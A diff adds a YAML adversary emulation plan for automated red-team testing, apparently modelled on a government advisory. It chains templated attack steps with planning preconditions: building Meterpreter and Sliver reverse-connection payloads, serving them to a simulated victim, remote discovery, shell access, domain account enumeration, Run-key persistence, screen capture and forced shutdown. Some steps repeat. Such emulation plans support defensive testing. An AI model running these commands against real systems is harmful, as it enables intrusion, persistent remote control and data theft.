@@ -1,0 +1,819 @@
+emulation_plan_details:
+  adversary_name: 2_AA24-046A
+  creation_time: 2026-02-18 07:33:12 UTC+0000
+attack_action_sequence:
+  - uuid: msfvenom-1
+    name: Build the executable file of a Meterpreter session (for Windows) using MSFVenom
+    id:
+      - T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      The command uses MSFVenom to generate a payload designed for remote access to a target machine.
+    execution:
+      executor: MSFVenom Console
+      command: |
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f exe -o #{SAVE_PATH}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        required: true
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        required: true
+      SAVE_PATH:
+        default:
+        description: Saved path of the generated payload
+        pddl_index: string0
+    preconditions:
+      - (os-windows ?target - host)
+    effects:
+      - (meterpreter_payload ?p - payload ?target - host)
+      - (file_payload ?p - payload ?file - file)
+      - (file_prepared_local ?path - string ?file - file)
+      - (exe_file ?file - file)
+  - uuid: simulate-download-execute-file
+    name: Simulate the victim download and execute malicious payload file
+    id:
+      - T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+      - linux
+    tactics:
+      - Execution
+    technique:
+      - 'User Execution: Malicious File'
+    description:
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server #{LPORT}
+
+        (On victim's machine)
+        1. Open #{LHOST}:8000 in the browser
+        2. Navigate to the path of the target payload file
+        3. Download the payload file
+        4. Execute the payload file to #{PATH} (If on a Linux machine, you also need to chmod the file)
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the http file server (typically the attacker machine)
+        type:
+      LPORT:
+        default: 8000
+        description: port of the http file server
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        required: true
+        pddl_index: string1
+    preconditions:
+      - (allow-simulate-user-action ?t - host)
+      - operator: or
+        operands:
+          - (os-linux ?t - host)
+          - (os-windows ?t - host)
+          - (os-macos ?t - host)
+      - (file_prepared_local ?localpath - string ?file - file)
+      - operator: or
+        operands:
+          - (exe_file ?file - file)
+          - (elf_file ?file - file)
+    effects:
+      - (file_exists ?path - string ?file - file ?t - host)
+      - (file_executed ?file - file ?t - host)
+  - uuid: execute-meterpreter-payload-file
+    name: Execute a Meterpreter Payload
+    id:
+      - T1071.001
+    source: Meterpreter
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Meterpreter payload will establish a Meterpreter session.
+    execution:
+      executor: None
+      command: |
+        None
+    arguments:
+    preconditions:
+      - (meterpreter_payload ?p - payload ?t - host)
+      - (file_payload ?p - payload ?f - file)
+      - (file_executed ?f - file ?t - host)
+    effects:
+      - (meterpreter_session ?s - executor ?t - host)
+      - operator: When
+        params:
+          condition: (file_executed_as_root ?f - file ?t - host)
+          effect: (elevated_executor ?s - executor)
+  - uuid: meterpreter-ps
+    name: List Processes
+    id:
+      - T1057
+    source: Metasploit
+    supported_platforms:
+      - linux
+      - windows
+    tactics:
+      - Discovery
+    technique: |
+      Process Discovery
+    description: Lists running processes on the remote host.
+    execution:
+      executor: Meterpreter Executor
+      command: ps (#{Executor})
+    arguments:
+      Executor:
+        description: The Meterpreter session ID of the active Metasploit connection
+        required: true
+        pddl_index: executor0
+    preconditions:
+      - operator: or
+        operands:
+          - (os-windows ?target - host)
+          - (os-linux ?target - host)
+      - (meterpreter_session ?executorID - executor ?target - host)
+    effects:
+      - (process_info ?target - host)
+  - uuid: meterpreter-cat
+    name: Read File Content
+    id:
+      - T1083
+    source: Metasploit
+    supported_platforms:
+      - linux
+      - windows
+    tactics:
+      - Discovery
+    technique: |
+      File and Directory Discovery
+    description: The `cat` command reads the contents of a specified file on the remote
+      host through Meterpreter session.
+    execution:
+      executor: Meterpreter Executor
+      command: cat (#{FilePath},#{Executor})
+    arguments:
+      Executor:
+        description: The Meterpreter session ID of the active Metasploit connection
+        required: true
+        pddl_index: executor0
+      FilePath:
+        description: Full path to the target file on remote system
+        required: true
+    preconditions:
+      - operator: or
+        operands:
+          - (os-windows ?target - host)
+          - (os-linux ?target - host)
+      - (meterpreter_session ?executorID - executor ?target - host)
+      - (file_exists ?path - string ?file - file ?target - host)
+    effects:
+      - (file_and_directory_info ?target - host)
+  - uuid: meterpreter-search
+    name: File Search
+    id:
+      - T1083
+    source: Metasploit
+    supported_platforms:
+      - linux
+      - windows
+    tactics:
+      - Discovery
+    technique: |
+      File and Directory Discovery
+    description: The `search` command finds files matching a pattern on the remote
+      host.
+    execution:
+      executor: Meterpreter Executor
+      command: search (#{Pattern},#{Executor})
+    arguments:
+      Executor:
+        description: The Meterpreter session ID of the active Metasploit connection
+        required: true
+        pddl_index: executor0
+      Pattern:
+        description: File search pattern (e.g., "*.txt")
+        required: true
+    preconditions:
+      - operator: or
+        operands:
+          - (os-windows ?target - host)
+          - (os-linux ?target - host)
+      - (meterpreter_session ?executorID - executor ?target - host)
+    effects:
+      - (file_and_directory_info ?target - host)
+  - uuid: meterpreter-getdesktop
+    name: Get Active Desktop
+    id:
+      - T1018
+    source: Metasploit
+    supported_platforms:
+      - windows
+    tactics:
+      - Discovery
+    technique: |
+      Remote System Discovery  
+    description: The `getdesktop` command displays the current active desktop session
+      information.
+    execution:
+      executor: Meterpreter Executor
+      command: getdesktop (#{Executor})
+    arguments:
+      Executor:
+        description: The Meterpreter session ID of the active Metasploit connection
+        required: true
+        pddl_index: executor0
+    preconditions:
+      - (os-windows ?target - host)
+      - (meterpreter_session ?executorID - executor ?target - host)
+    effects:
+      - (application_window_info ?target - host)
+  - uuid: meterpreter-ipconfig
+    name: List Network Interfaces (Windows)
+    id:
+      - T1049
+    source: Metasploit
+    supported_platforms:
+      - windows
+    tactics:
+      - Discovery
+    technique: |
+      System Network Configuration Discovery  
+    description: The `ipconfig` command displays TCP/IP network configuration on Windows
+      systems.
+    execution:
+      executor: Meterpreter Executor
+      command: ipconfig (#{Executor})
+    arguments:
+      Executor:
+        description: The Meterpreter session ID of the active Metasploit connection
+        required: true
+        pddl_index: executor0
+    preconditions:
+      - (os-windows ?target - host)
+      - (meterpreter_session ?executorID - executor ?target - host)
+    effects:
+      - (system_network_configuration_info ?target - host)
+  - uuid: meterpreter-arp
+    name: ARP Cache Inspection
+    id:
+      - T1040
+    source: Metasploit
+    supported_platforms:
+      - windows
+      - linux
+    tactics:
+      - Discovery
+    technique: |
+      Network Service Discovery
+    description: The `arp` command displays the target's ARP cache table through Meterpreter.
+    execution:
+      executor: Meterpreter Executor
+      command: arp (#{Executor})
+    arguments:
+      Executor:
+        description: The Meterpreter session ID of the active Metasploit connection
+        required: true
+        pddl_index: executor0
+    preconditions:
+      - operator: or
+        operands:
+          - (os-windows ?target - host)
+          - (os-linux ?target - host)
+      - (meterpreter_session ?executorID - executor ?target - host)
+    effects:
+      - (system_network_configuration_info ?target - host)
+  - uuid: meterpreter-getprivs
+    name: Discovery
+    id:
+      - T1068
+    source: Metasploit
+    supported_platforms:
+      - windows
+    tactics:
+      - Privilege Escalation
+    technique: |
+      Access Token Manipulation
+    description: The `getprivs` command attempts to obtain additional privileges.
+    execution:
+      executor: Meterpreter Executor
+      command: getprivs (#{Executor})
+    arguments:
+      Executor:
+        description: The Meterpreter session ID of the active Metasploit connection
+        required: true
+        pddl_index: executor0
+    preconditions:
+      - (os-windows ?target - host)
+      - (meterpreter_session ?executorID - executor ?target - host)
+    effects:
+      - (system_user_info ?target - host)
+  - uuid: meterpreter-shell
+    name: Interactive Shell Access (Windows)
+    id:
+      - T1059
+    source: Metasploit
+    supported_platforms:
+      - linux
+      - windows
+    tactics:
+      - Execution
+    technique: |
+      Command and Scripting Interpreter
+    description: The `shell` command spawns an interactive system shell on the target.
+    execution:
+      executor: Meterpreter Executor
+      command: shell(#{ParentExecutorID})
+    arguments:
+      ParentExecutorID:
+        description: The Meterpreter session ID of the active Metasploit connection
+        pddl_index: executor0
+        required: true
+      DerivedExecutorID:
+        pddl_index: executor4
+        required: true
+    preconditions:
+      - (os-windows ?target - host)
+      - (meterpreter_session ?executorID - executor ?target - host)
+    effects:
+      - (command_prompt ?s2 - executor ?t - host)
+  - uuid: 6fbc9e68-5ad7-444a-bd11-8bf3136c477e
+    name: Enumerate all accounts (Domain)
+    id:
+      - T1087.002
+    source: ART
+    supported_platforms:
+      - windows
+    tactics:
+      - Discovery
+    technique:
+      - 'Account Discovery: Domain Account'
+    description: |
+      Enumerate all accounts
+      Upon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session
+    execution:
+      executor: Command Prompt Executor
+      command: |
+        net user /domain
+        net group /domain
+    arguments:
+      Executor:
+        description: The executor for this action
+        required: true
+        pddl_index: executor4
+    dependencies:
+    preconditions:
+      - (command_prompt ?executor - executor ?target - host)
+      - (os-windows ?target - host)
+    effects:
+      - (domain_account_info ?target - host)
+  - uuid: meterpreter-pwd
+    name: Print Working Directory
+    id:
+      - T1083
+    source: Metasploit
+    supported_platforms:
+      - linux
+      - windows
+    tactics:
+      - Discovery
+    technique: |
+      File and Directory Discovery
+    description: The `pwd` command retrieves the current working directory path on
+      the remote host.
+    execution:
+      executor: Meterpreter Executor
+      command: pwd (#{Executor})
+    arguments:
+      Executor:
+        description: The Meterpreter session ID of the active Metasploit connection
+        required: true
+        pddl_index: executor0
+    preconditions:
+      - operator: or
+        operands:
+          - (os-windows ?target - host)
+          - (os-linux ?target - host)
+      - (meterpreter_session ?executorID - executor ?target - host)
+    effects:
+      - (file_and_directory_info ?target - host)
+  - uuid: meterpreter-getsid
+    name: Get Security Identifier
+    id:
+      - T1082
+    source: Metasploit
+    supported_platforms:
+      - windows
+    tactics:
+      - Discovery
+    technique: |
+      System Owner/User Discovery
+    description: The `getsid` command retrieves the Security Identifier (SID) of the
+      current user on Windows systems.
+    execution:
+      executor: Meterpreter Executor
+      command: getsid (#{Executor})
+    arguments:
+      Executor:
+        description: The Meterpreter session ID of the active Metasploit connection
+        required: true
+        pddl_index: executor0
+    preconditions:
+      - (os-windows ?target - host)
+      - (meterpreter_session ?executorID - executor ?target - host)
+    effects:
+      - (system_user_info ?target - host)
+  - uuid: sliver-payload-windows-exe
+    name: Build the executable file of a Sliver implant (for Windows)
+    id:
+      - T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
+    execution:
+      executor: Sliver Console
+      command: |
+        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
+        sliver > mtls --lport #{LPORT}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        required: true
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        required: true
+      SAVE_PATH:
+        default:
+        description: Saved path of the generated payload
+        required: true
+        pddl_index: string3
+    preconditions:
+      - (os-windows ?target - host)
+    effects:
+      - (sliver_implant_payload ?p - payload ?target - host)
+      - (file_payload ?p - payload ?file - file)
+      - (file_prepared_local ?path - string ?file - file)
+      - (exe_file ?file - file)
+  - uuid: simulate-download-file
+    name: Simulate the victim download a file on its machine
+    id:
+      - T1566.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Initial Access
+    technique:
+      - 'Phishing: Spearphishing Link'
+    description: This step simulates the victim accidentally downloads a malicious
+      file by clicking a link.
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server #{LPORT}
+
+        (On victim's machine)
+        1. Open #{LHOST}:#{LPORT} in the browser
+        2. Navigate to the path of the file on the attacker's machine
+        3. Download the file to #{PATH}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the http file server (typically the attacker machine)
+        type:
+        required: true
+      LPORT:
+        default: 8000
+        description: port of the http file server
+        type:
+        required: true
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        required: true
+        pddl_index: string4
+    preconditions:
+      - (allow-simulate-user-action ?t - host)
+      - operator: or
+        operands:
+          - (os-linux ?t - host)
+          - (os-windows ?t - host)
+          - (os-macos ?t - host)
+      - (file_prepared_local ?localpath - string ?file - file)
+    effects:
+      - (file_exists ?path - string ?file - file ?t - host)
+  - uuid: e55be3fd-3521-4610-9d1a-e210e42dcf05
+    name: Reg Key Run
+    id:
+      - T1547.001
+    source: ART
+    supported_platforms:
+      - windows
+    tactics:
+      - Persistence
+      - Privilege Escalation
+    technique:
+      - 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
+    description: |
+      Run Key Persistence
+
+      Upon successful execution, cmd.exe will modify the registry by adding \"Atomic Red Team\" to the Run key. Output will be via stdout. 
+    execution:
+      executor: Command Prompt Executor
+      command: |
+        REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
+    arguments:
+      Executor:
+        description: The executor for this action
+        required: true
+        pddl_index: executor4
+      command_to_execute:
+        description: Thing to Run
+        type: path
+        default: C:\Path\AtomicRedTeam.exe
+        pddl_index: string4
+    dependencies:
+    preconditions:
+      - (os-windows ?target - host)
+      - (command_prompt ?executor - executor ?target - host)
+      - (file_exists ?command_to_execute - string ?file - file ?target - host)
+      - (exe_file ?file - file)
+    effects:
+      - (file-execution-at-startup ?file - file ?target - host)
+  - uuid: obtain-persistent-sliver-executor
+    name: Obtain a persistent Sliver Executor
+    id:
+      - 
+    source: Manual
+    supported_platforms:
+      - windows
+      - linux
+      - macos
+    tactics:
+      - Persistence
+    technique:
+      - 
+    description: |
+      Obtain the persistency of Sliver Executor via scheduled payload file execution.
+    execution:
+      executor: None
+      command: |
+        None
+    arguments:
+    preconditions:
+      - (sliver_implant_payload ?p - payload ?target - host)
+      - (file_payload ?p - payload ?f - file)
+      - operator: or
+        operands:
+          - (file-execution-at-time ?f - file ?target - host)
+          - (file-execution-at-startup ?f - file ?target - host)
+          - (file-execution-at-event ?f - file ?target - host)
+    effects:
+      - (sliver_session ?s - executor ?target - host)
+      - (persistent-executor ?s - executor)
+  - uuid: simulate-download-execute-file-root
+    name: Simulate the victim download and execute malicious payload file as Admin
+      (Root)
+    id:
+      - T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - 'User Execution: Malicious File'
+    description:
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server #{LPORT}
+
+        (On victim's machine)
+        1. Open #{LHOST}:#{LPORT} in the browser
+        2. Navigate to the path of the target payload file
+        3. Download the payload file
+        4. Execute the payload file to #{SAVE_PATH} as Admin (Root)
+    arguments:
+      HOST:
+        default:
+        description: IP address of the http file server (typically the attacker machine)
+        type:
+      LPORT:
+        default: 8000
+        description: port of the http file server
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        required: true
+        pddl_index: string2
+    preconditions:
+      - (os-windows ?t - host)
+      - (file_prepared_local ?localpath - string ?file - file)
+      - (exe_file ?file - file)
+      - (allow-simulate-user-action ?t - host)
+    effects:
+      - (file_exists ?path - string ?file - file ?t - host)
+      - (file_executed ?file - file ?t - host)
+      - (file_executed_as_root ?file - file ?t - host)
+  - uuid: execute-meterpreter-payload-file
+    name: Execute a Meterpreter Payload
+    id:
+      - T1071.001
+    source: Meterpreter
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Meterpreter payload will establish a Meterpreter session.
+    execution:
+      executor: None
+      command: |
+        None
+    arguments:
+    preconditions:
+      - (meterpreter_payload ?p - payload ?t - host)
+      - (file_payload ?p - payload ?f - file)
+      - (file_executed ?f - file ?t - host)
+    effects:
+      - (meterpreter_session ?s - executor ?t - host)
+      - operator: When
+        params:
+          condition: (file_executed_as_root ?f - file ?t - host)
+          effect: (elevated_executor ?s - executor)
+  - uuid: meterpreter-screenshare
+    name: Remote Screen Capture
+    id:
+      - T1113
+    source: Metasploit
+    supported_platforms:
+      - windows
+    tactics:
+      - Collection
+    technique: |
+      Screen Capture
+    description: The `screenshare` command captures remote screen content in real
+      time.
+    execution:
+      executor: Meterpreter Executor
+      command: screenshare (#{quality},#{Executor})
+    arguments:
+      Executor:
+        description: The Meterpreter session ID of the active Metasploit connection
+        required: true
+        pddl_index: executor0
+      quality:
+        description: Image quality percentage (1-100)
+        required: true
+    preconditions:
+      - (os-windows ?target - host)
+      - (meterpreter_session ?executorID - executor ?target - host)
+    effects:
+      - (screenshot_data ?data - data ?target - host)
+      - (data-stored-c2 ?data - data)
+  - uuid: execute-meterpreter-payload-file
+    name: Execute a Meterpreter Payload
+    id:
+      - T1071.001
+    source: Meterpreter
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Meterpreter payload will establish a Meterpreter session.
+    execution:
+      executor: None
+      command: |
+        None
+    arguments:
+    preconditions:
+      - (meterpreter_payload ?p - payload ?t - host)
+      - (file_payload ?p - payload ?f - file)
+      - (file_executed ?f - file ?t - host)
+    effects:
+      - (meterpreter_session ?s - executor ?t - host)
+      - operator: When
+        params:
+          condition: (file_executed_as_root ?f - file ?t - host)
+          effect: (elevated_executor ?s - executor)
+  - uuid: meterpreter-screenshot
+    name: Capture Screen Image
+    id:
+      - T1113
+    source: Metasploit
+    supported_platforms:
+      - windows
+    tactics:
+      - Collection
+    technique: |
+      Screen Capture
+    description: The `screenshot` command captures the current desktop view and saves
+      it as an image file.
+    execution:
+      executor: Meterpreter Executor
+      command: screenshot (#{Executor})
+    arguments:
+      Executor:
+        description: The Meterpreter session ID of the active Metasploit connection
+        required: true
+        pddl_index: executor2
+    preconditions:
+      - (os-windows ?target - host)
+      - (meterpreter_session ?executorID - executor ?target - host)
+    effects:
+      - (screenshot_data ?data - data ?target - host)
+      - (data-stored-c2 ?data - data)
+  - uuid: meterpreter-screenshot
+    name: Capture Screen Image
+    id:
+      - T1113
+    source: Metasploit
+    supported_platforms:
+      - windows
+    tactics:
+      - Collection
+    technique: |
+      Screen Capture
+    description: The `screenshot` command captures the current desktop view and saves
+      it as an image file.
+    execution:
+      executor: Meterpreter Executor
+      command: screenshot (#{Executor})
+    arguments:
+      Executor:
+        description: The Meterpreter session ID of the active Metasploit connection
+        required: true
+        pddl_index: executor1
+    preconditions:
+      - (os-windows ?target - host)
+      - (meterpreter_session ?executorID - executor ?target - host)
+    effects:
+      - (screenshot_data ?data - data ?target - host)
+      - (data-stored-c2 ?data - data)
+  - uuid: meterpreter-shutdown
+    name: Force System Shutdown
+    id:
+      - T1529
+    source: Metasploit
+    supported_platforms:
+      - windows
+      - linux
+    tactics:
+      - Impact
+    technique: |
+      System Shutdown/Reboot
+    description: The `shutdown` command forces immediate system power off.
+    execution:
+      executor: Meterpreter Executor
+      command: shutdown (#{Executor})
+    arguments:
+      Executor:
+        description: The Meterpreter session ID of the active Metasploit connection
+        required: true
+        pddl_index: executor0
+    preconditions:
+      - operator: or
+        operands:
+          - (os-windows ?target - host)
+          - (os-linux ?target - host)
+      - (meterpreter_session ?executorID - executor ?target - host)
+    effects:
+      - (system-shutdown ?target - host)
+testbed_requirement:
+  host11:
+    os: windows
+    cve: []
